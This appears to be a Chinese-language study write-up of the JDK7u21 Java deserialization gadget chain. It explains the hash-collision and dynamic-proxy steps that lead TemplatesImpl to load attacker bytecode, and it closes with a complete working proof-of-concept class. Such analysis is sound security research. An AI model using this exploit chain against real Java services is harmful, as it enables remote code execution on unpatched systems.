# Jdk7u21




# Gadget

```java
LinkedHashSet.readObject()
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
```

# 利用链分析

这个利用链不需要依赖组件，原生的jre环境就可以利用了，看gadget可以发现，这里利用TemplatesImpl来进行恶意字节码的加载，而进入到TemplatesImpl的路径是动态代理

## AnnotationInvocationHandler

之前我们CC1学习到了动态代理，利用的是一个`AnnotationInvocationHandler`，他实现了InvocationHandler接口，是可以作为代理的，这里我代理我们的HashMap



CC1走的是他的invoke里面的get，进而进入到LazyMap的get然后

![image-20221025094901452](https://tuchuang.huamang.xyz/img/image-20221025094901452.png)

那么这里我们走的不是这里，而是后面的equalsImpl

```java
public Object invoke(Object var1, Method var2, Object[] var3) {
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
            return this.equalsImpl(var3[0]);
        } else {
            assert var5.length == 0;

```

跟进看，这里会执行到invoke

![image-20221025104729837](https://tuchuang.huamang.xyz/img/image-20221025104729837.png)

看链子是执行到了`TemplatesImpl.getOutputProperties()`，那么var1就是`TemplatesImpl`，var5就是`getOutputProperties`

## Dynamic Proxy

那么回到头上，我们要执行到AnnotationInvocationHandler.invoke，这里我们就可以使用动态代理了

被代理的对象执行方法的时候会转为调用invoke，那么我们衔接这个动态代理的方法就涉及到了`LinkedHashSet`了



## LinkedHashSet

首先从他的readobject进去分析，他自己没有实现readObject，但是他**内部实现基于 HashMap**，在 HashSet 的 `writeObject()` 方法中，会依次调用每个元素的 `writeObject()` 方法来实现序列化

```java
private void writeObject(java.io.ObjectOutputStream s)
        throws java.io.IOException {
        ....
        // Write out all elements in the proper order.
        for (E e : map.keySet())
            s.writeObject(e);
    }
```

相应的，在反序列化过程中，会依次调用每个元素的 `readObject()` 方法，然后将其作为 `key` (value 为固定值) 依次放入 HashMap 中（这里readObject的时候可能会触发put方法，但是并不影响我们利用链走向）

```java
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        ...
        // Read in all elements in the proper order.
        for (int i=0; i<size; i++) {
            E e = (E) s.readObject();
            map.put(e, PRESENT);
        }
    }
```

可以看到这里最后走进了一个put方法

跟进去put方法，这里可以看到就出现了equals了，而且出现了个很熟悉的东西：`e.hash == hash`

这就和CC7里的那个一样，hashcode碰撞

这个put方法，首先会调用内部 `hash()` 函数计算 key 的 hash 值，然后遍历所有元素，**当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 **，则认为 key 是否已经存在，返回 oldValue，否则调用 `addEntry()` 添加元素

```java
public V put(K key, V value) {
    if (key == null)
        return putForNullKey(value);
    int hash = hash(key);
    int i = indexFor(hash, table.length);
    for (Entry<K,V> e = table[i]; e != null; e = e.next) {
        Object k;
        if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {
            V oldValue = e.value;
            e.value = value;
            e.recordAccess(this);
            return oldValue;
        }
    }

    modCount++;
    addEntry(hash, key, value, i);
    return null;
}
```

可以发现，这里会比较`LinkedHashSet`的两个元素的hash，在这里也就是`templatesimpl`和`proxy`，那么如何让他们相等呢

> TemplateImpl的 hashCode() 是一个Native方法，每次运 行都会发生变化，我们理论上是无法预测的，所以想让proxy的 hashCode() 与之相等，只能寄希望于 proxy.hashCode() 。

而proxy调用`hashCode`方法，会跳转到`AnnotationInvocationHandler#invoke`，进而进入到`AnnotationInvocationHandler#hashCodeImpl`

```java
private int hashCodeImpl() {
  int result = 0;
  for (Map.Entry<String, Object> e : memberValues.entrySet()) {
    result += (127 * e.getKey().hashCode()) ^
    	memberValueHashCode(e.getValue());
  }
  return result;
}
```

如果 Entry 的 value 的 Class 不为 Array，也就是当 memberValues 中只有一个key和一个value时，则 `memberValueHashCode()` 函数返回 `value.hashCode()`，在这里相当于

```java
127 * key.hashCode() ^ value.hashCode();
```

所以我们控制他的key.hashCode为0就好了，这样result结果就变成了`value.hashCode()`

而这个hashCode为0的字符是存在的，这里可以用这个脚本来爆破

```java
public static void bruteHashCode()
{
  for (long i = 0; i < 9999999999L; i++) {
    if (Long.toHexString(i).hashCode() == 0) {
    	System.out.println(Long.toHexString(i));
  	}
  }
}
```

这里可以用`f5a5a608`也是ysoserial用的字符

那么会发现在第二次put的时候，计算的hash就是相同的了

![image-20221025221822131](https://tuchuang.huamang.xyz/img/image-20221025221822131.png)

那么后面就接上了我们之前说的动态代理

![image-20221026011053199](https://tuchuang.huamang.xyz/img/image-20221026011053199.png)

进入到Templatesimpl加载字节码

![image-20221026011134298](https://tuchuang.huamang.xyz/img/image-20221026011134298.png)



## POC

有两个小点

- 先定义无害HashMap，在LinkHashSet完成add操作后再把恶意代码加进去
- HashMap的value设定和LinkHashSet同款的TemplatesImpl对象来绕过hash

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;


public class JDK7u21 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazzz = pool.get("EvilTest");
        byte[] code = clazzz.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        String zeroHashCodeStr = "f5a5a608";

        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "1");

        // 实例化AnnotationInvocationHandler类
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);

        // 实例化HashSet，并将两个对象放进去
        HashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        // 将恶意templates设置到map中
        map.put(zeroHashCodeStr, templates);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(set);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();

    }
}
```



# 思考

这个链子算是我前几个分析过来比较复杂的，对于这个链子，我有几个思考，这里我打算详细的去跟进程序分析一下



看POC首先是他用了个HashMap，为什么这里要利用这么一个HashMap？

这里我对POC进行调试，发现readObject的时候，触发了两次put，顺序为：`TemplatesImpl -> proxy`

在第一次的put中，然后key通过`addEntry()`存入table中

![image-20221026022800758](https://tuchuang.huamang.xyz/img/image-20221026022800758.png)

那么第二次proxy进去的put的时候，我们再debug分析一下，因为这里我们是使用AnnotationInvocationHandler来代理了HashMap

所以这里的Templates是这样的，HashMap的键为f5a5a608，值为TemplatesImpl对象

```java
@javax.xml.transform.Templates(f5a5a608=com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl@18c78bdb)
```

我们跟进他的hash计算，这里进入hashCode()

![image-20221026021848182](https://tuchuang.huamang.xyz/img/image-20221026021848182.png)

因为是代理，所以进了invoke，执行的方法是hashCode，所以进入了hashCodeImpl

![image-20221026021954167](https://tuchuang.huamang.xyz/img/image-20221026021954167.png)



![image-20221026022125478](https://tuchuang.huamang.xyz/img/image-20221026022125478.png)

这里因为只有一对键值对，所以算法简化成`127 * key.hashCode() ^ value.hashCode();`

那么重点就来了，这里key是我们精心构造的，他的hashCode()结果为0，而这个value，我们为他设置的是恶意的TemplatesImpl对象，**重要的是这个TemplatesImpl对象和LinkedHashSet第一个put的是同款**，所以导致了LinkedHashSet的两个对象，他们的hashcode是一样的


